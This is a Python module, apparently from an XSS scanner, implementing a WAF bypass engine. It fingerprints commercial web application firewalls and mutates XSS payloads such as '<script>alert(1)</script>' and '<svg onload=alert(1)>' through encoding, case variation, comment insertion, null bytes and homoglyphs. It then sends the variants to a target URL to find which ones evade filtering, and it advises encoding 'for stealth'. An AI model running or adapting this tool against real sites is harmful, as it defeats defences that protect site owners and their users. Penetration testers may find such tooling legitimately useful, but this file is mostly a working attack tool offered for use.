#!/usr/bin/env python3
"""
Advanced WAF Bypass System for XSS Scanner
This module provides sophisticated WAF detection and bypass techniques
"""

import re
import random
import string
import urllib.parse
import base64
import hashlib
from typing import List, Dict, Tuple
import requests
import time

class WAFBypassEngine:
    """Advanced WAF Bypass Engine with multiple techniques"""
    
    def __init__(self):
        self.bypass_techniques = {
            'encoding': self._encoding_bypass,
            'case_variation': self._case_variation,
            'comment_injection': self._comment_injection,
            'parameter_pollution': self._parameter_pollution,
            'header_injection': self._header_injection,
            'chunked_encoding': self._chunked_encoding,
            'null_bytes': self._null_bytes,
            'unicode_normalization': self._unicode_normalization,
            'template_injection': self._template_injection,
            'protocol_switching': self._protocol_switching
        }
        
        self.waf_signatures = {
            'cloudflare': {
                'headers': ['cf-ray', 'cf-cache-status', 'cloudflare'],
                'indicators': ['cloudflare', 'cf-bgj'],
                'bypass_methods': ['encoding', 'case_variation', 'comment_injection']
            },
            'incapsula': {
                'headers': ['incap_ses', 'visid_incap', 'incapsula'],
                'indicators': ['incapsula', 'incap'],
                'bypass_methods': ['encoding', 'null_bytes', 'chunked_encoding']
            },
            'akamai': {
                'headers': ['akamai', 'ak-bmsc'],
                'indicators': ['akamai'],
                'bypass_methods': ['header_injection', 'parameter_fragmentation']
            },
            'aws_waf': {
                'headers': ['x-amz-cf-id', 'aws-waf'],
                'indicators': ['aws-waf', 'amazon'],
                'bypass_methods': ['encoding', 'case_variation']
            },
            'mod_security': {
                'headers': [],
                'indicators': ['mod_security', 'libmodsecurity'],
                'bypass_methods': ['encoding', 'comment_injection', 'unicode_normalization']
            }
        }

    def detect_waf(self, response: requests.Response) -> Dict[str, any]:
        """Enhanced WAF detection with detailed analysis"""
        waf_info = {
            'detected': False,
            'type': None,
            'confidence': 0,
            'indicators': [],
            'bypass_methods': [],
            'response_analysis': self._analyze_response(response)
        }
        
        # Check headers for WAF signatures
        for waf_type, config in self.waf_signatures.items():
            for header in config['headers']:
                if header.lower() in str(response.headers).lower():
                    waf_info['detected'] = True
                    waf_info['type'] = waf_type
                    waf_info['confidence'] += 30
                    waf_info['indicators'].append(f"Header: {header}")
                    waf_info['bypass_methods'] = config['bypass_methods']
        
        # Check response content for WAF indicators
        content_lower = response.text.lower()
        for waf_type, config in self.waf_signatures.items():
            for indicator in config['indicators']:
                if indicator.lower() in content_lower:
                    waf_info['detected'] = True
                    if not waf_info['type']:
                        waf_info['type'] = waf_type
                    waf_info['confidence'] += 20
                    waf_info['indicators'].append(f"Content: {indicator}")
                    if not waf_info['bypass_methods']:
                        waf_info['bypass_methods'] = config['bypass_methods']
        
        # Check for generic WAF indicators
        generic_indicators = [
            'blocked', 'forbidden', 'access denied', 'security violation',
            'firewall', 'protection', 'unauthorized', 'malicious request',
            'threat detected', 'attack blocked'
        ]
        
        for indicator in generic_indicators:
            if indicator in content_lower:
                waf_info['detected'] = True
                waf_info['confidence'] += 10
                waf_info['indicators'].append(f"Generic: {indicator}")
                if not waf_info['bypass_methods']:
                    waf_info['bypass_methods'] = ['encoding', 'case_variation', 'comment_injection']
        
        # Check response codes
        if response.status_code in [403, 406, 429, 503]:
            waf_info['detected'] = True
            waf_info['confidence'] += 15
            waf_info['indicators'].append(f"Status Code: {response.status_code}")
        
        return waf_info

    def generate_bypass_payloads(self, original_payload: str, waf_info: Dict) -> List[str]:
        """Generate bypass payloads based on detected WAF"""
        bypass_payloads = [original_payload]
        
        if not waf_info['detected']:
            # If no WAF detected, still generate some bypass variants
            bypass_methods = ['encoding', 'case_variation', 'comment_injection']
        else:
            bypass_methods = waf_info['bypass_methods']
        
        for method in bypass_methods:
            if method in self.bypass_techniques:
                try:
                    variants = self.bypass_techniques[method](original_payload)
                    bypass_payloads.extend(variants)
                except Exception as e:
                    print(f"Error applying bypass method {method}: {e}")
        
        # Remove duplicates and return
        return list(set(bypass_payloads))

    def _encoding_bypass(self, payload: str) -> List[str]:
        """Multiple encoding techniques"""
        variants = []
        
        # URL encoding
        variants.append(urllib.parse.quote(payload))
        variants.append(urllib.parse.quote(payload, safe=''))
        
        # Double URL encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))
        
        # HTML entities
        variants.append(''.join(f'&#{ord(c)};' for c in payload))
        variants.append(''.join(f'&#x{ord(c):x};' for c in payload))
        
        # Unicode encoding
        variants.append(''.join(f'\\u{ord(c):04x}' for c in payload))
        
        # Base64 encoding
        variants.append(base64.b64encode(payload.encode()).decode())
        
        # Hex encoding
        variants.append(''.join(f'%{ord(c):02x}' for c in payload))
        
        # Mixed encoding
        mixed = payload
        for i, char in enumerate(payload):
            if i % 2 == 0:
                mixed = mixed.replace(char, urllib.parse.quote(char), 1)
            else:
                mixed = mixed.replace(char, f'&#{ord(char)};', 1)
        variants.append(mixed)
        
        return variants

    def _case_variation(self, payload: str) -> List[str]:
        """Case variation techniques"""
        variants = []
        
        # Random case
        random_case = ''.join(
            char.upper() if random.random() > 0.5 else char.lower() 
            for char in payload
        )
        variants.append(random_case)
        
        # Alternating case
        alternating = ''.join(
            char.upper() if i % 2 == 0 else char.lower() 
            for i, char in enumerate(payload)
        )
        variants.append(alternating)
        
        # Mixed case for specific keywords
        mixed_keywords = payload
        keywords = ['script', 'alert', 'onerror', 'onload', 'javascript']
        for keyword in keywords:
            if keyword in mixed_keywords.lower():
                # Replace with mixed case version
                mixed_keywords = re.sub(
                    keyword, 
                    ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(keyword)),
                    mixed_keywords, 
                    flags=re.IGNORECASE
                )
        variants.append(mixed_keywords)
        
        return variants

    def _comment_injection(self, payload: str) -> List[str]:
        """HTML comment injection techniques"""
        variants = []
        
        # Wrap parts in HTML comments
        parts = payload.split('>')
        if len(parts) > 1:
            commented = f"{parts[0]}><!--{''.join(random.choices(string.ascii_letters, k=10))}-->{'>'.join(parts[1:])}"
            variants.append(commented)
        
        # Add comments between attributes
        if '=' in payload:
            parts = payload.split('=')
            if len(parts) > 1:
                commented = f"{parts[0]}<!--{''.join(random.choices(string.ascii_letters, k=5))}-->{'='.join(parts[1:])}"
                variants.append(commented)
        
        # JavaScript comment injection
        if 'script' in payload.lower():
            commented = payload.replace('<script>', '<!--<script>')
            commented = commented.replace('</script>', '</script>-->')
            variants.append(commented)
        
        return variants

    def _parameter_pollution(self, payload: str) -> List[str]:
        """HTTP Parameter Pollution techniques"""
        variants = []
        
        # Add duplicate parameters with different values
        if '=' in payload:
            param, value = payload.split('=', 1)
            variants.append(f"{param}={value}&{param}={value}")
            variants.append(f"{param}={value}&{param}=")
            variants.append(f"{param}=&{param}={value}")
        
        # Add empty parameters
        variants.append(f"{payload}&empty=&test=")
        variants.append(f"empty=&{payload}&test=")
        
        return variants

    def _header_injection(self, payload: str) -> List[str]:
        """HTTP header injection techniques"""
        variants = []
        
        # User-Agent injection
        variants.append(f"User-Agent: {payload}")
        
        # Referer injection
        variants.append(f"Referer: {payload}")
        
        # Custom header injection
        variants.append(f"X-Forwarded-For: {payload}")
        variants.append(f"X-Real-IP: {payload}")
        
        return variants

    def _chunked_encoding(self, payload: str) -> List[str]:
        """Chunked encoding techniques"""
        variants = []
        
        # Split payload into chunks
        chunk_size = 10
        chunks = [payload[i:i+chunk_size] for i in range(0, len(payload), chunk_size)]
        
        # Create chunked version
        chunked = ''.join(f"{len(chunk):x}\r\n{chunk}\r\n" for chunk in chunks)
        chunked += "0\r\n\r\n"
        variants.append(chunked)
        
        return variants

    def _null_bytes(self, payload: str) -> List[str]:
        """Null byte injection techniques"""
        variants = []
        
        # Insert null bytes
        null_payload = payload.replace('<', '\x00<')
        variants.append(null_payload)
        
        # Null byte at the end
        variants.append(payload + '\x00')
        
        # Null byte in the middle
        if len(payload) > 5:
            middle = len(payload) // 2
            variants.append(payload[:middle] + '\x00' + payload[middle:])
        
        return variants

    def _unicode_normalization(self, payload: str) -> List[str]:
        """Unicode normalization bypass techniques"""
        variants = []
        
        # Unicode variants for common characters
        unicode_map = {
            'a': ['а', 'ɑ', 'α'],  # Cyrillic, IPA, Greek
            'e': ['е', 'ε'],       # Cyrillic, Greek
            'o': ['о', 'ο'],       # Cyrillic, Greek
            'p': ['р', 'ρ'],       # Cyrillic, Greek
            'c': ['с', 'ϲ'],       # Cyrillic, Greek
            'x': ['х', 'χ'],       # Cyrillic, Greek
            'y': ['у', 'γ'],       # Cyrillic, Greek
        }
        
        for char, variants_list in unicode_map.items():
            for variant in variants_list:
                if char in payload:
                    variants.append(payload.replace(char, variant))
        
        return variants

    def _template_injection(self, payload: str) -> List[str]:
        """Template injection techniques"""
        variants = []
        
        # Server-side template injection
        template_payloads = [
            f"{{{{ {payload} }}}}",
            f"{{% {payload} %}}",
            f"${{{payload}}}",
            f"#{payload}",
        ]
        
        variants.extend(template_payloads)
        
        return variants

    def _protocol_switching(self, payload: str) -> List[str]:
        """Protocol switching techniques"""
        variants = []
        
        # Different protocol schemes
        protocols = ['javascript:', 'data:', 'vbscript:', 'file:']
        
        for protocol in protocols:
            if not payload.startswith(protocol):
                variants.append(f"{protocol}{payload}")
        
        return variants

    def _analyze_response(self, response: requests.Response) -> Dict:
        """Analyze response for WAF characteristics"""
        analysis = {
            'status_code': response.status_code,
            'response_time': response.elapsed.total_seconds(),
            'content_length': len(response.text),
            'headers': dict(response.headers),
            'content_indicators': []
        }
        
        content_lower = response.text.lower()
        
        # Look for WAF-specific content
        waf_content_indicators = [
            'cloudflare', 'incapsula', 'akamai', 'aws-waf',
            'mod_security', 'barracuda', 'f5', 'imperva',
            'sucuri', 'wordfence', 'sitelock'
        ]
        
        for indicator in waf_content_indicators:
            if indicator in content_lower:
                analysis['content_indicators'].append(indicator)
        
        return analysis

    def test_bypass_effectiveness(self, target_url: str, payload: str, waf_info: Dict) -> Dict:
        """Test effectiveness of bypass techniques"""
        results = {
            'original_blocked': False,
            'bypass_successful': False,
            'successful_payloads': [],
            'bypass_methods': {}
        }
        
        # Test original payload
        try:
            response = requests.get(target_url, params={'test': payload}, timeout=10)
            if response.status_code in [403, 406, 429]:
                results['original_blocked'] = True
        except:
            results['original_blocked'] = True
        
        # Test bypass payloads
        bypass_payloads = self.generate_bypass_payloads(payload, waf_info)
        
        for bypass_payload in bypass_payloads:
            try:
                response = requests.get(target_url, params={'test': bypass_payload}, timeout=10)
                
                if response.status_code == 200:
                    results['bypass_successful'] = True
                    results['successful_payloads'].append(bypass_payload)
                    
                    # Identify which bypass method worked
                    for method, technique in self.bypass_techniques.items():
                        if bypass_payload in technique(payload):
                            results['bypass_methods'][method] = True
                            
            except Exception as e:
                continue
        
        return results

    def generate_advanced_bypass_payloads(self, payload: str) -> List[str]:
        """Generate advanced bypass payloads using multiple techniques"""
        advanced_payloads = []
        
        # Combine multiple bypass techniques
        techniques = ['encoding', 'case_variation', 'comment_injection']
        
        for technique in techniques:
            if technique in self.bypass_techniques:
                variants = self.bypass_techniques[technique](payload)
                advanced_payloads.extend(variants)
        
        # Generate payloads with multiple techniques combined
        encoded_payloads = self._encoding_bypass(payload)
        for encoded in encoded_payloads[:3]:  # Limit to avoid too many combinations
            case_variants = self._case_variation(encoded)
            for case_var in case_variants[:2]:
                comment_variants = self._comment_injection(case_var)
                advanced_payloads.extend(comment_variants[:2])
        
        return list(set(advanced_payloads))  # Remove duplicates

    def create_waf_profile(self, target_url: str) -> Dict:
        """Create a detailed WAF profile for the target"""
        profile = {
            'target': target_url,
            'waf_detected': False,
            'waf_type': None,
            'confidence': 0,
            'bypass_methods': [],
            'test_results': {},
            'recommendations': []
        }
        
        # Test with various payloads to build WAF profile
        test_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '<svg onload=alert(1)>'
        ]
        
        for payload in test_payloads:
            try:
                response = requests.get(target_url, params={'test': payload}, timeout=10)
                waf_info = self.detect_waf(response)
                
                if waf_info['detected']:
                    profile['waf_detected'] = True
                    profile['waf_type'] = waf_info['type']
                    profile['confidence'] = max(profile['confidence'], waf_info['confidence'])
                    profile['bypass_methods'].extend(waf_info['bypass_methods'])
                
                profile['test_results'][payload] = {
                    'status_code': response.status_code,
                    'blocked': response.status_code in [403, 406, 429],
                    'waf_info': waf_info
                }
                
            except Exception as e:
                profile['test_results'][payload] = {'error': str(e)}
        
        # Remove duplicate bypass methods
        profile['bypass_methods'] = list(set(profile['bypass_methods']))
        
        # Generate recommendations
        if profile['waf_detected']:
            profile['recommendations'] = [
                f"Use {method} bypass techniques for {profile['waf_type']}" 
                for method in profile['bypass_methods']
            ]
        else:
            profile['recommendations'] = [
                "No WAF detected - standard payloads should work",
                "Consider using encoding variations for stealth"
            ]
        
        return profile